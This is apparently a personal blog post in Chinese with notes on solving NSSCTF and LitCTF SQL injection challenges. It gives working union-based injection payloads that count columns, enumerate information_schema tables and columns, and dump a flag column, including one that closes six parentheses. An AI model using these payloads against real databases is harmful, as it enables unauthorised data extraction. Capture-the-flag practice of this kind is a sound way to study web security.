---
layout: post
title: NSSCTF（sql
date: 2024-09-25 13:57:19 +0800
categories: [ctf赛集（）]
---

#### re-sql
     

初步判断是单引号字符型
输wllm=1‘会报错
（开始有点想考虑报错注入，但是<mark>由于能显示name和password所以先按常规字符型走走看)</mark>
1’ order by 3--+（这里用---好像不太行）
判断有三列
然后按常规try
-1' union select 1,version(),database()--+
回显这个

     Your Login name:10.2.29-MariaDB-log  
     Your Password:test_db

group_concat(table_name) from information_schema.tables where table_schema='test_db'--+

然后得到test_tb，users
    （直接试试test_tb会好很多，但是由于习惯我先试了users，然后后面跟sql-labs很像，得到的password是yyy，不是flag，去test_tb找会发现很容易找到flag）
    【以后建议这种题吧，一般不从users开始找，从其他】

group_concat(column_name) from information_schema.columns where table_name='test_tb'--+

很舒服看到了id，flag
直接爆flag就可以得到

group_concat(flag) from test_tb--+

得到flag


#### EasySQL


输入1得到
Array ( [0] => 1 )
输入1‘没有回显
输入1“显示nonono
输入数字的时候回显，输入字符的时候啥也不回显


#### 这是什么？SQL ！注一下 ！
    #### LitCTF 2023


好像可以用这个做sqlmap查一下



常规
应该是加6个括号))))))

两列

1)))))) union select 1,flag from ctftraining.flag#
-1)))))) union SELECT 1,group_concat(flag) FROM ctftraining.flag #
